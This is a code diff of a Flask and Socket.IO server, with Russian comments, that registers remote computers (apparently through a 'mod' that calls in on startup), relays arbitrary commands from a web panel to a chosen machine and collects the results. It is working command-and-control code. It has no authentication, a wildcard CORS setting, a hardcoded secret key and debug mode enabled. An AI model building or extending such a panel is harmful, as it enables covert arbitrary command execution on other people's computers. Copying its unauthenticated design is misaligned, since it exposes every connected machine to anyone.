@@ -1,35 +1,32 @@
-from flask import Flask, request, jsonify, render_template
+from flask import Flask, render_template, request
+from flask_socketio import SocketIO, emit
 import sqlite3
 import json
 from datetime import datetime
 import uuid
+import eventlet
+eventlet.monkey_patch()
 
 app = Flask(__name__)
+app.config['SECRET_KEY'] = 'kaka-secret-key'
+socketio = SocketIO(app, cors_allowed_origins="*", ping_timeout=30, ping_interval=10)
 
-# Инициализация базы данных
+# База данных
 def init_db():
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    # Таблица компьютеров
     c.execute('''CREATE TABLE IF NOT EXISTS computers
                  (id TEXT PRIMARY KEY,
                   name TEXT,
                   last_seen TIMESTAMP,
-                  status TEXT)''')
-    # Таблица команд
-    c.execute('''CREATE TABLE IF NOT EXISTS commands
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  computer_id TEXT,
-                  command TEXT,
                   status TEXT,
-                  result TEXT,
-                  created_at TIMESTAMP)''')
+                  sid TEXT)''')  # добавили session id
     conn.commit()
     conn.close()
 
 init_db()
 
-# Главная страница - панель управления
+# Веб-интерфейс
 @app.route('/')
 def index():
     conn = sqlite3.connect('database.db')
@@ -38,76 +35,62 @@ def index():
     conn.close()
     return render_template('index.html', computers=computers)
 
-# Регистрация компьютера (мод вызывает при запуске)
-@app.route('/api/register', methods=['POST'])
-def register():
-    data = request.json
-    computer_id = str(uuid.uuid4())[:8]
+# WebSocket: регистрация компьютера
+@socketio.on('register')
+def handle_register(data):
     computer_name = data.get('name', 'Unknown')
+    computer_id = str(uuid.uuid4())[:8]
     
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    c.execute("INSERT INTO computers (id, name, last_seen, status) VALUES (?, ?, ?, ?)",
-              (computer_id, computer_name, datetime.now(), 'online'))
+    c.execute("INSERT OR REPLACE INTO computers (id, name, last_seen, status, sid) VALUES (?, ?, ?, ?, ?)",
+              (computer_id, computer_name, datetime.now(), 'online', request.sid))
     conn.commit()
     conn.close()
     
-    return jsonify({"computer_id": computer_id})
+    emit('registered', {'computer_id': computer_id})
 
-# Получение команд (мод опрашивает)
-@app.route('/api/poll/<computer_id>', methods=['GET'])
-def poll(computer_id):
+# WebSocket: получение команд от браузера
+@socketio.on('send_command')
+def handle_send_command(data):
+    computer_id = data['computer_id']
+    command = data['command']
+    
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    
-    # Обновляем last_seen
-    c.execute("UPDATE computers SET last_seen=?, status=? WHERE id=?",
-              (datetime.now(), 'online', computer_id))
-    
-    # Ищем новую команду
-    command = c.execute("SELECT id, command FROM commands WHERE computer_id=? AND status='pending' ORDER BY id LIMIT 1",
-                        (computer_id,)).fetchone()
-    
-    if command:
-        # Помечаем как отправленную
-        c.execute("UPDATE commands SET status='sent' WHERE id=?", (command[0],))
-        conn.commit()
-        conn.close()
-        return jsonify({"command": command[1]})
-    
+    # Получаем session id компьютера
+    result = c.execute("SELECT sid FROM computers WHERE id=?", (computer_id,)).fetchone()
     conn.close()
-    return jsonify({"command": None})
-
-# Отправка результата выполнения
-@app.route('/api/result/<computer_id>', methods=['POST'])
-def result(computer_id):
-    data = request.json
-    command = data.get('command')
-    result_data = data.get('result')
     
+    if result and result[0]:
+        # Отправляем команду конкретному компьютеру
+        socketio.emit('command', {'command': command}, room=result[0])
+        emit('command_sent', {'status': 'ok'})
+    else:
+        emit('command_sent', {'status': 'error', 'message': 'Computer offline'})
+
+# WebSocket: результат от компьютера
+@socketio.on('command_result')
+def handle_command_result(data):
+    computer_id = data['computer_id']
+    command = data['command']
+    result = data['result']
+    
+    # Можно сохранить в БД или отправить в браузер
+    socketio.emit('command_done', {
+        'computer_id': computer_id,
+        'command': command,
+        'result': result
+    })
+
+# WebSocket: отключение компьютера
+@socketio.on('disconnect')
+def handle_disconnect():
     conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    c.execute("UPDATE commands SET status='done', result=? WHERE computer_id=? AND command=? AND status='sent'",
-              (result_data, computer_id, command))
+    c.execute("UPDATE computers SET status='offline' WHERE sid=?", (request.sid,))
     conn.commit()
     conn.close()
-    
-    return jsonify({"status": "ok"})
-
-# Отправка команды с веб-панели
-@app.route('/api/send_command', methods=['POST'])
-def send_command():
-    computer_id = request.form['computer_id']
-    command = request.form['command']
-    
-    conn = sqlite3.connect('database.db')
-    c = conn.cursor()
-    c.execute("INSERT INTO commands (computer_id, command, status, created_at) VALUES (?, ?, ?, ?)",
-              (computer_id, command, 'pending', datetime.now()))
-    conn.commit()
-    conn.close()
-    
-    return jsonify({"status": "queued"})
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    socketio.run(app, debug=True, port=5000)
